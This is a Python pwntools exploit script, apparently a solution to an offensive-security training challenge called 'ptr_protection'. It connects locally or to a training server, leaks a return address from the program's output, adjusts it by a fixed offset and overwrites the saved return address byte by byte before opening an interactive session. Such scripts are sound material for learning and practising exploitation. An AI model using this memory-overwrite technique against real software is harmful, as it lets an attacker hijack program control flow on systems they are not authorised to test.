from pwn import *
import time
import string

context.log_level ="DEBUG"
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    if "NORMAL" not in args:
        r = process("./ptr_protection")
        gdb.attach(r, """
        c
        break *challenge+241
        break *challenge+178
        """)
    else:
        r = process("./ptr_protection")    
else:
    r = remote("bin.training.offdef.it", 4202)


def atoi(str):
    resultant = 0
    for i in range(len(str)):
        resultant = resultant * 10 + (ord(str[i]) - ord('0'))        #It is ASCII substraction 
    return resultant

def send(index, data):
    r.recvuntil(b": ")
    r.sendline(bytes(str(index), 'ascii'))
    r.recvuntil(b": ")
    r.sendline(bytes(str(data), 'ascii'))


data = [0xe8,0x51,0x1d,0x7e,0x7d,0x55,0x00,0x00]

send(40,0x55)


    # send(40,0xe8)
    # send(41,0x51)
    # send(42,0x1d)
    # send(43,0x7e)
    # send(44,0x7d)
    # send(45,0x55)
    # send(46,0x00)
    # send(47,0x00)


r.recvuntil(b": ")
r.sendline(bytes(str(-1), 'ascii'))

r.recvuntil(b"return 0x")
returnadd = r.read(12)
print(returnadd)

ret = "0x" + returnadd.decode()
print(ret)


intadd = int(ret, base=16)
print("address %#x" %intadd)
offset = 0x5555 - 0x51e8
intadd = intadd -offset
print("address %#x" %intadd)


context.log_level ="DEBUG"
for i in range(6):
    send(i+104,(intadd%256))
    intadd = intadd >> 8

send(110,0)
send(111,0)





r.interactive()